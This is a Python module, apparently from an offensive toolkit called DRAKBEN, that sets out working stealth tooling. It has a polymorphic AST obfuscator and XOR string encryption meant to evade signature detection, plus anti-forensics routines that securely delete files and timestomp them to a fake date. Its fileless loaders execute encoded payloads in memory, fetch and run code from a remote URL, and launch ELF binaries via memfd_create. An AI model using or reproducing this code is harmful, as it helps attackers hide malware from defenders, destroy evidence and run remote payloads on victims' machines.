"""
DRAKBEN Ghost Protocol - Polymorphic Engine & Anti-Detection
Author: @drak_ben
Description: Code obfuscation and evasion techniques for stealth operations.

This module provides:
- AST-based code transformation
- Variable name obfuscation
- Dead code injection
- String encryption
- Anti-signature techniques
"""

import ast
import base64
import hashlib
import logging
import os
import random
import string
import time
from typing import Any, Dict, List, Set, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# CONSTANTS
# =============================================================================

# Characters for obfuscated variable names
OBFUSCATION_CHARS = string.ascii_letters + "_"

# Reserved Python keywords that cannot be used as variable names
PYTHON_KEYWORDS = {
    "False", "None", "True", "and", "as", "assert", "async", "await",
    "break", "class", "continue", "def", "del", "elif", "else", "except",
    "finally", "for", "from", "global", "if", "import", "in", "is",
    "lambda", "nonlocal", "not", "or", "pass", "raise", "return", "try",
    "while", "with", "yield"
}

# Built-in names that should not be obfuscated
BUILTIN_NAMES = {
    "print", "len", "range", "str", "int", "float", "list", "dict", "set",
    "tuple", "bool", "open", "input", "type", "isinstance", "hasattr",
    "getattr", "setattr", "delattr", "enumerate", "zip", "map", "filter",
    "sorted", "reversed", "sum", "min", "max", "abs", "all", "any",
    "bin", "hex", "oct", "ord", "chr", "format", "repr", "hash", "id",
    "dir", "vars", "globals", "locals", "callable", "exec", "eval",
    "compile", "__import__", "Exception", "BaseException", "ValueError",
    "TypeError", "KeyError", "IndexError", "AttributeError", "RuntimeError",
    "self", "cls", "args", "kwargs", "__name__", "__main__", "__init__",
    "__str__", "__repr__", "__call__", "__enter__", "__exit__"
}


# =============================================================================
# POLYMORPHIC TRANSFORMER
# =============================================================================

class PolymorphicTransformer(ast.NodeTransformer):
    """
    AST-based code transformer for polymorphic obfuscation.

    Transforms Python code to evade signature-based detection by:
    1. Renaming variables to random names
    2. Injecting dead code blocks
    3. Transforming loop structures
    4. Encrypting string literals

    Usage:
        transformer = PolymorphicTransformer()
        obfuscated_code = transformer.transform(original_code)
    """

    def __init__(
        self,
        obfuscate_names: bool = True,
        inject_dead_code: bool = True,
        encrypt_strings: bool = True,
        preserve_docstrings: bool = True
    ):
        """
        Initialize transformer with configuration.

        Args:
            obfuscate_names: Rename variables to random names
            inject_dead_code: Add non-executing code blocks
            encrypt_strings: Encode string literals
            preserve_docstrings: Keep docstrings readable
        """
        super().__init__()
        self.obfuscate_names = obfuscate_names
        self.inject_dead_code = inject_dead_code
        self.encrypt_strings = encrypt_strings
        self.preserve_docstrings = preserve_docstrings

        # Mapping of original names to obfuscated names
        self.name_mapping: Dict[str, str] = {}

        # Track function/class definitions
        self.defined_names: Set[str] = set()

        # Counter for unique name generation
        self._name_counter = 0

        # Seed for reproducible obfuscation (optional)
        self._seed = int(time.time())
        random.seed(self._seed)

    def transform(self, code: str) -> str:
        """
        Transform Python code with polymorphic obfuscation.

        Args:
            code: Original Python source code

        Returns:
            Obfuscated Python source code
        """
        try:
            tree = ast.parse(code)
        except SyntaxError as e:
            logger.error(f"Syntax error in input code: {e}")
            return code

        # First pass: collect all defined names
        self._collect_defined_names(tree)

        # Second pass: apply transformations
        transformed_tree = self.visit(tree)

        # Third pass: inject dead code if enabled
        if self.inject_dead_code:
            transformed_tree = self._inject_dead_code_blocks(transformed_tree)

        # Fix missing locations
        ast.fix_missing_locations(transformed_tree)

        try:
            return ast.unparse(transformed_tree)
        except Exception as e:
            logger.error("Failed to unparse transformed AST: %s", e)
            return code

    def _collect_defined_names(self, tree: ast.AST) -> None:
        """Collect all user-defined names from the AST"""
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                self.defined_names.add(node.name)
                for arg in node.args.args:
                    self.defined_names.add(arg.arg)
            elif isinstance(node, ast.ClassDef):
                self.defined_names.add(node.name)
            elif isinstance(node, ast.Name) and isinstance(node.ctx, ast.Store):
                self.defined_names.add(node.id)
            elif isinstance(node, ast.arg):
                self.defined_names.add(node.arg)

    def _generate_obfuscated_name(self) -> str:
        """Generate a random obfuscated variable name"""
        self._name_counter += 1

        # Generate a name like _x7a3b2c1_ (underscore prefixed and suffixed)
        random_part = ''.join(random.choices(OBFUSCATION_CHARS, k=8))
        name = f"_{random_part}{self._name_counter}_"

        # Ensure it's not a keyword
        while name in PYTHON_KEYWORDS:
            random_part = ''.join(random.choices(OBFUSCATION_CHARS, k=8))
            name = f"_{random_part}{self._name_counter}_"

        return name

    def _get_obfuscated_name(self, original: str) -> str:
        """Get or create obfuscated name for an original name"""
        if original in PYTHON_KEYWORDS or original in BUILTIN_NAMES:
            return original

        if original.startswith("__") and original.endswith("__"):
            return original  # Preserve dunder methods

        if original not in self.name_mapping:
            self.name_mapping[original] = self._generate_obfuscated_name()

        return self.name_mapping[original]

    def visit_Name(self, node: ast.Name) -> ast.Name:  # pylint: disable=invalid-name
        """Transform variable names"""
        if self.obfuscate_names and node.id in self.defined_names:
            node.id = self._get_obfuscated_name(node.id)
        return self.generic_visit(node)

    def visit_FunctionDef(self, node: ast.FunctionDef) -> ast.FunctionDef:  # pylint: disable=invalid-name
        """Transform function definitions"""
        # Preserve docstring if configured
        if (self.preserve_docstrings and
            node.body and
            isinstance(node.body[0], ast.Expr) and
            isinstance(node.body[0].value, ast.Constant) and
            isinstance(node.body[0].value.value, str)):
            pass # Docstring logic placeholder

        # Obfuscate function name (except main and special methods)
        if (self.obfuscate_names and
            not node.name.startswith("__") and
            node.name not in ("main", "run")):
            node.name = self._get_obfuscated_name(node.name)

        # Obfuscate argument names
        if self.obfuscate_names:
            for arg in node.args.args:
                if arg.arg not in ("self", "cls"):
                    arg.arg = self._get_obfuscated_name(arg.arg)

        # Visit children
        node = self.generic_visit(node)

        return node

    def visit_ClassDef(self, node: ast.ClassDef) -> ast.ClassDef:  # pylint: disable=invalid-name
        """Transform class definitions"""
        # Obfuscate class name
        if self.obfuscate_names and not node.name.startswith("_"):
            node.name = self._get_obfuscated_name(node.name)

        return self.generic_visit(node)

    def visit_Constant(self, node: ast.Constant) -> ast.AST:  # pylint: disable=invalid-name
        """Transform string constants (encryption)"""
        if (self.encrypt_strings and
            isinstance(node.value, str) and
            len(node.value) > 3 and
            not node.value.startswith("__")):

            # Skip docstrings (handled separately)
            return self._create_encrypted_string(node.value)

        return node

    def _create_encrypted_string(self, value: str) -> ast.Call:
        """Create an encrypted string expression"""
        # Base64 encode the string
        encoded = base64.b64encode(value.encode()).decode()

        # Create: __import__('base64').b64decode('encoded').decode()
        return ast.Call(
            func=ast.Attribute(
                value=ast.Call(
                    func=ast.Attribute(
                        value=ast.Call(
                            func=ast.Name(id="__import__", ctx=ast.Load()),
                            args=[ast.Constant(value="base64")],
                            keywords=[]
                        ),
                        attr="b64decode",
                        ctx=ast.Load()
                    ),
                    args=[ast.Constant(value=encoded)],
                    keywords=[]
                ),
                attr="decode",
                ctx=ast.Load()
            ),
            args=[],
            keywords=[]
        )

    def _inject_dead_code_blocks(self, tree: ast.Module) -> ast.Module:
        """Inject dead code blocks that never execute"""
        dead_code_templates = [
            ast.If(
                test=ast.Constant(value=False),
                body=[
                    ast.Expr(value=ast.Constant(value=None)),
                    ast.Pass()
                ],
                orelse=[]
            ),
            # Unreachable after return
            ast.If(
                test=ast.Compare(
                    left=ast.Constant(value=0),
                    ops=[ast.Gt()],
                    comparators=[ast.Constant(value=1)]
                ),
                body=[ast.Pass()],
                orelse=[]
            ),
        ]

        # Insert dead code at random positions
        new_body = []
        for i, node in enumerate(tree.body):
            new_body.append(node)
            if random.random() < 0.3:  # 30% chance to inject dead code
                dead_code = random.choice(dead_code_templates)
                new_body.append(dead_code)

        tree.body = new_body
        return tree


# =============================================================================
# STRING ENCRYPTION UTILITIES
# =============================================================================

class StringEncryptor:
    """
    Utility class for string encryption/decryption.

    Provides multiple encryption methods for evading string-based signatures.
    """

    @staticmethod
    def xor_encrypt(text: str, key: str = "drakben") -> str:
        """XOR encrypt a string"""
        result = []
        for i, char in enumerate(text):
            result.append(chr(ord(char) ^ ord(key[i % len(key)])))
        return base64.b64encode(''.join(result).encode('latin-1')).decode()

    @staticmethod
    def xor_decrypt(encrypted: str, key: str = "drakben") -> str:
        """XOR decrypt a string"""
        try:
            decoded = base64.b64decode(encrypted).decode('latin-1')
            result = []
            for i, char in enumerate(decoded):
                result.append(chr(ord(char) ^ ord(key[i % len(key)])))
            return ''.join(result)
        except Exception:
            return encrypted

    @staticmethod
    def rot13(text: str) -> str:
        """Apply ROT13 encoding"""
        return text.translate(str.maketrans(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
            "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"
        ))

    @staticmethod
    def chunk_and_join(text: str) -> Tuple[List[str], str]:
        """Split string into chunks for concatenation"""
        chunk_size = random.randint(2, 5)
        chunks = [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]
        var_names = [f"_s{i}_" for i in range(len(chunks))]
        return chunks, " + ".join(var_names)


# =============================================================================
# SECURE MEMORY & ANTI-FORENSICS
# =============================================================================

class SecureCleanup:
    """
    Secure deletion and anti-forensics utilities.

    Provides methods for:
    - Secure file deletion (DoD 5220.22-M standard)
    - Memory wiping
    - Timestamp manipulation
    """

    @staticmethod
    def secure_delete(filepath: str, passes: int = 3) -> bool:
        """
        Securely delete a file with multiple overwrite passes.

        Args:
            filepath: Path to file to delete
            passes: Number of overwrite passes (default: 3)

        Returns:
            True if successfully deleted
        """
        if not os.path.exists(filepath):
            return True

        try:
            file_size = os.path.getsize(filepath)

            with open(filepath, "r+b") as f:
                for pass_num in range(passes):
                    f.seek(0)
                    if pass_num % 3 == 0:
                        # Pass 1: All zeros
                        f.write(b'\x00' * file_size)
                    elif pass_num % 3 == 1:
                        # Pass 2: All ones
                        f.write(b'\xFF' * file_size)
                    else:
                        # Pass 3: Random data
                        f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())

            os.remove(filepath)
            logger.debug(f"Securely deleted: {filepath}")
            return True

        except Exception as e:
            logger.error(f"Secure delete failed for {filepath}: {e}")
            return False

    @staticmethod
    def wipe_string(s: str) -> None:
        """
        Attempt to wipe a string from memory.

        Note: Python's memory management makes this difficult,
        but we try to overwrite the internal buffer.
        """
        try:
            import ctypes
            # Get the memory address of the string
            str_address = id(s)
            # Overwrite with zeros (this is a best-effort attempt)
            ctypes.memset(str_address + 48, 0, len(s))
        except Exception:
            pass  # Silently fail - this is best-effort

    @staticmethod
    def timestomp(filepath: str, reference_file: str = None) -> bool:
        """
        Modify file timestamps to match a reference file or system file.

        Args:
            filepath: Path to file to modify
            reference_file: Optional reference file for timestamps

        Returns:
            True if successful
        """
        if not os.path.exists(filepath):
            return False

        try:
            if reference_file and os.path.exists(reference_file):
                # Use reference file's timestamps
                ref_stat = os.stat(reference_file)
                os.utime(filepath, (ref_stat.st_atime, ref_stat.st_mtime))
            else:
                # Use a common system timestamp (Jan 1, 2020)
                fake_time = 1577836800  # 2020-01-01 00:00:00 UTC
                os.utime(filepath, (fake_time, fake_time))

            logger.debug(f"Timestomped: {filepath}")
            return True

        except Exception as e:
            logger.error(f"Timestomp failed for {filepath}: {e}")
            return False


# =============================================================================
# GHOST PROTOCOL MANAGER
# =============================================================================

class GhostProtocol:
    """
    Main interface for Ghost Protocol features.

    Combines polymorphic transformation, encryption, and anti-forensics
    into a single easy-to-use interface.

    Usage:
        ghost = GhostProtocol()
        stealthy_code = ghost.obfuscate_code(original_code)
        ghost.secure_cleanup("temp_file.py")
    """

    def __init__(
        self,
        enable_obfuscation: bool = True,
        enable_encryption: bool = True,
        enable_dead_code: bool = True
    ):
        """
        Initialize Ghost Protocol.

        Args:
            enable_obfuscation: Enable name obfuscation
            enable_encryption: Enable string encryption
            enable_dead_code: Enable dead code injection
        """
        self.transformer = PolymorphicTransformer(
            obfuscate_names=enable_obfuscation,
            encrypt_strings=enable_encryption,
            inject_dead_code=enable_dead_code
        )
        self.encryptor = StringEncryptor()
        self.cleanup = SecureCleanup()

        logger.info("Ghost Protocol initialized")

    def obfuscate_code(self, code: str) -> str:
        """
        Apply full obfuscation pipeline to code.

        Args:
            code: Original Python source code

        Returns:
            Obfuscated code
        """
        return self.transformer.transform(code)

    def encrypt_string(self, text: str, method: str = "xor") -> str:
        """
        Encrypt a string using specified method.

        Args:
            text: String to encrypt
            method: Encryption method ("xor", "base64", "rot13")

        Returns:
            Encrypted string
        """
        if method == "xor":
            return self.encryptor.xor_encrypt(text)
        elif method == "base64":
            return base64.b64encode(text.encode()).decode()
        elif method == "rot13":
            return self.encryptor.rot13(text)
        else:
            return text

    def decrypt_string(self, text: str, method: str = "xor") -> str:
        """
        Decrypt a string using specified method.

        Args:
            text: Encrypted string
            method: Decryption method

        Returns:
            Decrypted string
        """
        if method == "xor":
            return self.encryptor.xor_decrypt(text)
        elif method == "base64":
            try:
                return base64.b64decode(text).decode()
            except Exception:
                return text
        elif method == "rot13":
            return self.encryptor.rot13(text)  # ROT13 is self-inverse
        else:
            return text

    def secure_delete_file(self, filepath: str) -> bool:
        """Securely delete a file"""
        return self.cleanup.secure_delete(filepath)

    def timestomp_file(self, filepath: str, reference: str = None) -> bool:
        """Modify file timestamps"""
        return self.cleanup.timestomp(filepath, reference)

    def cleanup_session(self, files: List[str]) -> int:
        """
        Clean up all session files securely.

        Args:
            files: List of file paths to delete

        Returns:
            Number of files successfully deleted
        """
        deleted = 0
        for filepath in files:
            if self.secure_delete_file(filepath):
                deleted += 1
        return deleted


# =============================================================================
# MODULE-LEVEL FUNCTIONS
# =============================================================================

def obfuscate(code: str) -> str:
    """
    Quick-access function to obfuscate code.

    Args:
        code: Python source code

    Returns:
        Obfuscated code
    """
    transformer = PolymorphicTransformer()
    return transformer.transform(code)



# Singleton
_ghost_protocol = None  # pylint: disable=invalid-name

def get_ghost_protocol() -> GhostProtocol:
    """
    Get singleton GhostProtocol instance.

    Returns:
        GhostProtocol instance
    """
    global _ghost_protocol  # pylint: disable=global-statement
    if _ghost_protocol is None:
        _ghost_protocol = GhostProtocol()
    return _ghost_protocol


# =============================================================================
# MEMORY-ONLY EXECUTION (Fileless)
# =============================================================================

class MemoryOnlyExecutor:
    """
    Execute code directly in memory without writing to disk.

    Techniques:
    - Python exec() with compiled code objects
    - Linux memfd_create for binary execution
    - Windows in-memory execution stubs

    This is critical for evading file-based detection.
    """

    def __init__(self):
        self._executed_code: List[str] = []
        self._namespace: Dict[str, Any] = {}
        logger.info("MemoryOnlyExecutor initialized")

    def execute_code(
        self,
        code: str,
        namespace: Dict[str, Any] = None
    ) -> Tuple[bool, Any]:
        """
        Execute Python code entirely in memory.

        Args:
            code: Python source code to execute
            namespace: Optional namespace for execution

        Returns:
            Tuple of (success, result_or_error)
        """
        try:
            # Compile to bytecode (in memory)
            compiled = compile(code, "<memory>", "exec")

            # Prepare namespace
            exec_namespace = namespace.copy() if namespace else {}
            exec_namespace.update(self._namespace)

            # Execute
            exec(compiled, exec_namespace)

            # Track for cleanup
            self._executed_code.append(hashlib.md5(code.encode()).hexdigest()[:8])

            # Return result if there's a 'result' variable
            result = exec_namespace.get("result", None)

            return True, result

        except Exception as e:
            logger.error(f"Memory execution failed: {e}")
            return False, str(e)

    def execute_function(
        self,
        code: str,
        function_name: str,
        args: tuple = (),
        kwargs: dict = None
    ) -> Tuple[bool, Any]:
        """
        Execute a function defined in memory.

        Args:
            code: Python code containing function definition
            function_name: Name of function to call
            args: Positional arguments
            kwargs: Keyword arguments

        Returns:
            Tuple of (success, result_or_error)
        """
        try:
            # Compile and execute to define function
            compiled = compile(code, "<memory>", "exec")
            namespace = {}
            exec(compiled, namespace)

            # Get function
            func = namespace.get(function_name)
            if not callable(func):
                return False, f"Function '{function_name}' not found"

            # Call function
            result = func(*args, **(kwargs or {}))
            return True, result

        except Exception as e:
            logger.error(f"Memory function execution failed: {e}")
            return False, str(e)

    def create_module_in_memory(
        self,
        module_name: str,
        code: str
    ) -> Tuple[bool, Any]:
        """
        Create a Python module entirely in memory.

        Args:
            module_name: Name for the module
            code: Module source code

        Returns:
            Tuple of (success, module_or_error)
        """
        try:
            import types
            import sys

            # Create module object
            module = types.ModuleType(module_name)

            # Compile and execute in module's namespace
            compiled = compile(code, f"<memory:{module_name}>", "exec")
            # pylint: disable=exec-used
            exec(compiled, module.__dict__)

            # Add to sys.modules (optional - for imports)
            sys.modules[module_name] = module

            return True, module

        except Exception as e:  # pylint: disable=broad-except
            logger.error("Memory module creation failed: %s", e)
            return False, str(e)

    def cleanup_namespace(self) -> None:
        """Clear the execution namespace"""
        self._namespace.clear()
        self._executed_code.clear()


class SecureMemory:
    """
    Secure memory handling and cleanup.

    Provides:
    - Secure variable wiping
    - Memory buffer overwriting
    - Python object cleanup
    - Garbage collection forcing
    """

    @staticmethod
    def secure_wipe_bytes(data: bytearray) -> None:
        """
        Securely wipe a bytearray in place.

        Args:
            data: Bytearray to wipe
        """
        for i in range(len(data)):
            data[i] = 0

    @staticmethod
    def secure_wipe_string_buffer(buffer_id: int, length: int) -> bool:
        """
        Attempt to wipe a string buffer at given memory address.

        Note: This is best-effort due to Python's memory management.

        Args:
            buffer_id: Memory address (from id())
            length: Length of buffer

        Returns:
            True if wipe attempted
        """
        try:
            import ctypes
            # String object header is typically 48 bytes in CPython
            ctypes.memset(buffer_id + 48, 0, length)
            return True
        except Exception:
            return False

    @staticmethod
    def force_gc() -> int:
        """
        Force garbage collection and return objects collected.

        Returns:
            Number of objects collected
        """
        import gc
        return gc.collect()

    @staticmethod
    def clear_dict_secure(d: Dict[str, Any]) -> None:
        """
        Securely clear a dictionary by overwriting values first.

        Args:
            d: Dictionary to clear
        """
        for key in list(d.keys()):
            if isinstance(d[key], (str, bytes, bytearray)):
                # Overwrite value
                d[key] = None
            del d[key]

    @staticmethod
    def create_secure_buffer(size: int) -> bytearray:
        """
        Create a bytearray that can be securely wiped.

        Args:
            size: Buffer size in bytes

        Returns:
            Bytearray initialized to zeros
        """
        return bytearray(size)

    @staticmethod
    def wipe_and_delete(obj: Any) -> None:
        """
        Attempt to wipe and delete an object.

        Args:
            obj: Object to wipe
        """
        if isinstance(obj, bytearray):
            SecureMemory.secure_wipe_bytes(obj)
        elif isinstance(obj, str):
            SecureMemory.secure_wipe_string_buffer(id(obj), len(obj))
        elif isinstance(obj, dict):
            SecureMemory.clear_dict_secure(obj)
        elif isinstance(obj, list):
            obj.clear()

        del obj


class FilelessLoader:
    """
    Load and execute code without touching disk.

    Supports:
    - Base64 encoded payloads
    - XOR encrypted payloads
    - Compressed payloads
    - Remote payload fetching (in-memory only)
    """

    def __init__(self):
        self.executor = MemoryOnlyExecutor()
        self.secure_mem = SecureMemory()
        logger.info("FilelessLoader initialized")

    def load_base64_payload(self, encoded: str) -> Tuple[bool, Any]:
        """
        Load and execute base64 encoded Python code.

        Args:
            encoded: Base64 encoded Python code

        Returns:
            Tuple of (success, result_or_error)
        """
        try:
            code = base64.b64decode(encoded).decode('utf-8')
            result = self.executor.execute_code(code)

            # Attempt to wipe decoded code from memory
            self.secure_mem.wipe_and_delete(code)

            return result

        except Exception as e:
            return False, str(e)

    def load_xor_payload(
        self,
        encrypted: bytes,
        key: bytes
    ) -> Tuple[bool, Any]:
        """
        Load and execute XOR encrypted Python code.

        Args:
            encrypted: XOR encrypted code
            key: Decryption key

        Returns:
            Tuple of (success, result_or_error)
        """
        try:
            # Decrypt in memory
            decrypted = bytearray(len(encrypted))
            for i, byte in enumerate(encrypted):
                decrypted[i] = byte ^ key[i % len(key)]

            code = decrypted.decode('utf-8')
            result = self.executor.execute_code(code)

            # Secure wipe
            self.secure_mem.secure_wipe_bytes(decrypted)

            return result

        except Exception as e:
            return False, str(e)

    def load_compressed_payload(self, compressed: bytes) -> Tuple[bool, Any]:
        """
        Load and execute zlib compressed Python code.

        Args:
            compressed: Zlib compressed code

        Returns:
            Tuple of (success, result_or_error)
        """
        try:
            import zlib
            code = zlib.decompress(compressed).decode('utf-8')
            return self.executor.execute_code(code)
        except Exception as e:
            return False, str(e)

    def load_remote_payload(
        self,
        url: str,
        headers: Dict[str, str] = None,
        decode: str = None
    ) -> Tuple[bool, Any]:
        """
        Fetch and execute code from remote URL (in-memory only).

        Args:
            url: URL to fetch code from
            headers: Optional HTTP headers
            decode: Optional decoding ('base64', 'xor')

        Returns:
            Tuple of (success, result_or_error)
        """
        try:
            import urllib.request

            request = urllib.request.Request(url)
            if headers:
                for key, value in headers.items():
                    request.add_header(key, value)

            with urllib.request.urlopen(request, timeout=30) as response:
                data = response.read()

            if decode == 'base64':
                code = base64.b64decode(data).decode('utf-8')
            else:
                code = data.decode('utf-8')

            return self.executor.execute_code(code)

        except Exception as e:
            return False, str(e)

    def cleanup(self) -> None:
        """Clean up all loaded code and namespace"""
        self.executor.cleanup_namespace()
        self.secure_mem.force_gc()


# Linux-specific fileless execution (memfd_create)
class LinuxFilelessExecutor:
    """
    Linux-specific fileless binary execution using memfd_create.

    memfd_create creates an anonymous file in memory that can be
    executed without ever touching disk.

    Requires: Linux kernel 3.17+
    """

    MFD_CLOEXEC = 0x0001

    def __init__(self):
        self._available = self._check_memfd_create()
        if self._available:
            logger.info("Linux memfd_create available")
        else:
            logger.warning("memfd_create not available")

    def _check_memfd_create(self) -> bool:
        """Check if memfd_create is available"""
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6", use_errno=True)
            return hasattr(libc, 'memfd_create')
        except Exception:
            return False

    def execute_binary_in_memory(
        self,
        binary_data: bytes,
        args: List[str] = None,
        name: str = "payload"
    ) -> Tuple[bool, str]:
        """
        Execute a binary entirely from memory using memfd_create.

        Args:
            binary_data: ELF binary data
            args: Command line arguments
            name: Name for the memfd (appears in /proc)

        Returns:
            Tuple of (success, output_or_error)
        """
        if not self._available:
            return False, "memfd_create not available"

        try:
            import ctypes
            import subprocess

            libc = ctypes.CDLL("libc.so.6", use_errno=True)

            # Create anonymous memory file
            memfd_create = libc.memfd_create
            memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
            memfd_create.restype = ctypes.c_int

            fd = memfd_create(name.encode(), self.MFD_CLOEXEC)
            if fd == -1:
                return False, "Failed to create memfd"

            # Write binary to memory file
            os.write(fd, binary_data)

            # Get path to memfd
            fd_path = f"/proc/self/fd/{fd}"

            # Execute
            cmd = [fd_path] + (args or [])
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60,
                check=False
            )

            os.close(fd)

            return result.returncode == 0, result.stdout + result.stderr

        except Exception as e:
            return False, str(e)

    def is_available(self) -> bool:
        """Check if this executor is available"""
        return self._available


# =============================================================================
# EXTENDED MODULE-LEVEL FUNCTIONS
# =============================================================================

def execute_in_memory(code: str) -> Tuple[bool, Any]:
    """
    Quick function to execute code in memory.

    Args:
        code: Python code to execute

    Returns:
        Tuple of (success, result_or_error)
    """
    executor = MemoryOnlyExecutor()
    return executor.execute_code(code)


def load_encoded_payload(payload: str) -> Tuple[bool, Any]:
    """
    Load and execute a base64 encoded payload.

    Args:
        payload: Base64 encoded Python code

    Returns:
        Tuple of (success, result_or_error)
    """
    loader = FilelessLoader()
    return loader.load_base64_payload(payload)



# Global singleton
_fileless_loader = None  # pylint: disable=invalid-name

def get_fileless_loader() -> FilelessLoader:
    """
    Get singleton FilelessLoader instance.

    Returns:
        FilelessLoader instance
    """
    global _fileless_loader  # pylint: disable=global-statement
    if _fileless_loader is None:
        _fileless_loader = FilelessLoader()
    return _fileless_loader


# =============================================================================
# SECURE MEMORY - RAM Cleanup Module (Stateful Extension)
# =============================================================================

class RAMCleaner:
    """
    Stateful memory manager for trakcing and wiping sensitive data.
    Works alongside the static SecureMemory utilities.
    """

    def __init__(self):
        self._sensitive_refs = []
        logger.info("RAMCleaner initialized")

    def store_sensitive(self, data: str) -> int:
        """
        Store sensitive data and return a reference ID.
        Data is stored as mutable bytearray for secure deletion.
        """
        # Convert to bytearray (mutable)
        ba = bytearray(data.encode('utf-8'))
        ref_id = id(ba)
        self._sensitive_refs.append(ba)
        return ref_id

    def wipe(self, ref_id: int) -> bool:
        """
        Securely wipe data from memory by overwriting.
        """
        for ba in self._sensitive_refs:
            if id(ba) == ref_id:
                # Overwrite with zeros
                for i, _ in enumerate(ba):
                    ba[i] = 0
                # Overwrite with random
                for i, _ in enumerate(ba):
                    ba[i] = random.randint(0, 255)
                # Final zero pass
                for i, _ in enumerate(ba):
                    ba[i] = 0

                self._sensitive_refs.remove(ba)
                del ba
                logger.debug("Wiped sensitive data ref: %s", ref_id)
                return True
        return False

    def register_sensitive(self, data: str) -> None:
        """
        Register sensitive string for later wiping.
        Converts string to mutable bytearray and tracks it.
        """
        if not data:
            return
        # Create a mutable bytearray copy of the data
        ba = bytearray(data.encode('utf-8'))
        self._sensitive_refs.append(ba)

    def wipe_all(self) -> int:
        """
        Wipe all stored sensitive data.
        Returns count of wiped items.
        """
        count = 0
        for ba in self._sensitive_refs[:]:
            for i, _ in enumerate(ba):
                ba[i] = 0
            self._sensitive_refs.remove(ba)
            del ba
            count += 1

        logger.info("Wiped %d sensitive data items from RAM", count)
        return count

    def secure_string(self, data: str) -> 'SecureString':
        """Create a secure string that auto-wipes"""
        return SecureString(data, self)


class SecureString:
    """
    A string wrapper that securely wipes itself when deleted.
    """

    def __init__(self, data: str, manager: RAMCleaner):
        self._data = bytearray(data.encode('utf-8'))
        self._manager = manager

    def get(self) -> str:
        """Get the string value"""
        return self._data.decode('utf-8')

    def __del__(self):
        """Securely wipe on garbage collection"""
        if hasattr(self, '_data'):
            for i, _ in enumerate(self._data):
                self._data[i] = 0
            del self._data

    def __str__(self):
        return "[REDACTED]"

    def __repr__(self):
        return "SecureString([REDACTED])"


# Singleton
_ram_cleaner = None  # pylint: disable=invalid-name

def get_ram_cleaner() -> RAMCleaner:
    """Get singleton RAMCleaner instance"""
    global _ram_cleaner  # pylint: disable=global-statement
    if _ram_cleaner is None:
        _ram_cleaner = RAMCleaner()
    return _ram_cleaner


